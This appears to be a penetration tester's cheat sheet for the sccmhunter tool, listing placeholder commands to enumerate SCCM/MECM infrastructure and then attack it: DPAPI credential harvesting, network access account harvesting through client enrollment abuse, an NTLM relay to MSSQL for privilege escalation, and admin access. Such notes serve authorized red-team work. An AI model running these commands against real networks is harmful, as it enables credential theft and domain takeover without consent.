# sccmhunter

% sccm, mecm
#plateform/linux  #target/remote #cat/RECON 

## _url
```
https://github.com/garrettfoster13/sccmhunter
```

## _desc
```
.sccmhunter/logs/db/find.db
to install set dependencies on last version (i.e remove version in requirements.txt)
```

## _links
```
https://github.com/garrettfoster13/sccmhunter/wiki
```

##  enum - ldap (creds)
```bash
python3 sccmhunter.py find -debug  -u <user> -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

##  enum - ldap (pth)
```bash
python3 sccmhunter.py find -debug  -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

##  enum - ldap (ptt)
```bash
KRB5CCNAME=<ccache>  python3 sccmhunter.py find -debug  -u <user> -no-pass -k -d <domain_fqdn> -dc-ip <dc_fqdn>
```

## enum - smb (creds)
```bash
python3 sccmhunter.py smb -debug  -u <user> -p <password> -d <domain_fqdn> -save -dc-ip <dc_fqdn>
```

## show - all
```bash
python3 sccmhunter.py show  -all
```


#cat/ATTACK 

## harvest creds - DPAPI (cred local admin)
```bash
python3 sccmhunter.py dpapi -debug  -u <user>  -p '<password>' -target <target_ip>
```


## harvest creds - DPAPI (pth local admin)
```bash
python3 sccmhunter.py dpapi -debug  -u <user>  -hashes :<nt_hash> -target <target_ip>
```

## harvest naa - http (abuse client enrollment)
```bash
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep <sleep|10> -auto
```

## privesc - ntlmrelay to mssql helper
```bash
python3 sccmhunter.py mssql -stacked -d <domain_fqdn -dc-ip <dc_fqdn> -tu <target_user> -sc <sccm_site_code> -u <user> -p '<password>'
```

#cat/POST


## admin - connect
```bash
python3 sccmhunter.py admin -debug  -u <user> -p <password> -ip <site_server_target>
```